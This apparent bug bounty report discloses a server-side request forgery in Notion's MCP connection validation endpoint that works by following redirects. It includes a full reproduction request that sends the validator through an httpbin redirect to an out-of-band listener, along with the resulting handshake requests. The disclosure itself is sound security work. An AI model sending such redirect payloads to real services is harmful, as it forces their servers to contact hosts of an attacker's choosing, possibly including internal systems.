Title: SSRF via Redirect Following in Notion's MCP Connection Validator

Severity: High (or Medium if triager disagrees on impact)
Asset: Product API (notion.so/api/v3)

Summary:
The POST /api/v3/validateMcpConnection endpoint accepts a user-supplied serverUrl. During validation, Notion's backend (Notion-MCP-Client/1.0) blindly follows HTTP redirects. An authenticated user can supply a URL that redirects to an arbitrary destination, causing Notion's infrastructure to make requests and initiate an MCP handshake with the target. This allows an attacker to bypass URL validation and force Notion's servers to interact with internal or external endpoints.

Steps To Reproduce:

    Set up an Out-of-Band (OAST) listener (e.g., bqvvkrfxzdnmfqslrpxpj67t0u2a2yzmw.oast.fun).

    Send the following request to configure an MCP connection with a redirecting URL (e.g., using httpbin.org as a redirector):

http

POST /api/v3/validateMcpConnection HTTP/1.1
Host: www.notion.so
Cookie: token_v2=<YOUR_VALID_TOKEN>
x-notion-active-user-header: <YOUR_USER_ID>
Content-Type: application/json

{
  "serverUrl": "https://httpbin.org/redirect-to?url=http://<YOUR_OAST_HOST>/mcp",
  "spaceId": "<YOUR_SPACE_ID>",
  "authHeaders": [],
  "initiationContext": "connect"
}

    Observe your OAST listener. Notion's backend follows the redirect and sends multiple requests to the OAST host:

        GET /.well-known/openid-configuration

        HEAD /mcp

        POST /mcp (JSON-RPC handshake)

        GET /mcp (SSE stream)

Impact:
An attacker with a Business/Enterprise workspace can force Notion's backend to send requests to arbitrary endpoints, including internal services, by using an HTTP redirect to bypass initial URL validation. While this report demonstrates the redirect behavior using an external OAST listener, the same mechanism could be used to interact with internal infrastructure.

Supporting Material/References:

    OAST logs showing the redirect following and MCP handshake.
### Impact

The `POST /api/v3/validateMcpConnection` endpoint accepts a user-supplied MCP server URL and follows HTTP redirects during validation. By supplying a URL that redirects to an attacker-controlled host, I demonstrated that Notion's backend (`User-Agent: Notion-MCP-Client/1.0`) follows the redirect and initiates a full sequence of MCP-related requests to the redirected destination.

The observed request sequence included:
- MCP server discovery (`/.well-known/mcp.json`)
- OAuth/authentication metadata discovery (`/.well-known/openid-configuration`, `/.well-known/oauth-protected-resource`, `/.well-known/oauth-authorization-server`)
- Protocol initialization and streaming (`HEAD /mcp`, `POST /mcp`, `GET /mcp`)

These requests were captured by my controlled out-of-band listener and are attributable to Notion's infrastructure via the source IP, `User-Agent`, and internal Sentry tracing headers (`sentry-org_id: 324374`).

**The demonstrated impact is server-side request initiation to an attacker-controlled destination through HTTP redirect following, bypassing any validation applied to the original URL.**

I have not established access to internal services, cloud metadata, sensitive credentials, or protected internal data, and I do not claim those impacts. However, the ability to redirect the validator to an arbitrary destination is the core primitive required for SSRF. If the backend does not re-validate redirect destinations against its internal network boundaries, this behavior could allow an attacker to reach internal services that are otherwise unreachable from the public internet.

I am reporting this behavior so that Notion can assess whether redirect destinations are appropriately validated and whether the MCP connection validator enforces the intended restrictions on outbound requests.
